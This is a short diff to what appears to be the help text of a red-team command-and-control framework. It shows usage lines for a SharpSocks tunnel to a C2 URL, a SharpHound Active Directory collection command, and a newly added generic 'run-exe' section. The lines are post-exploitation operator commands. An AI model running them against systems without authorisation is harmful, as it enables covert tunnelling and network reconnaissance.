@@ -124,8 +124,15 @@ sharpsocks
 run-exe SharpSocksImplantTestApp.Program SharpSocks -url1 /Barbara-Anne/Julissa/Moll/Jolie/Tiphany/Jessa/Letitia -url2 /Barbara-Anne/Julissa/Moll/Jolie/Tiphany/Jessa/Letitia -c raFAdgVujTHBwcvMuRFYgKHqp -k fFaKiMspoTWHPbu3PvUNvpzTkuq+VKDp+h1X79q3gXQ= -s https://10.10.10.1 -b 5000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken
 
 Bloodhound:
-=============
+===========
 sharphound --ZipFileName c:\\temp\\test.zip --JsonFolder c:\\temp\\
+
+Run Generic C# Executable:
+=============================
+# See Alias.py for examples or to add your own aliases
+loadmodule MyBinary.exe
+run-exe <FullyQualifiedClassWithMainMethod> <MyBinaryAssemblyName>
+
 """
 
 posh_help1 = """
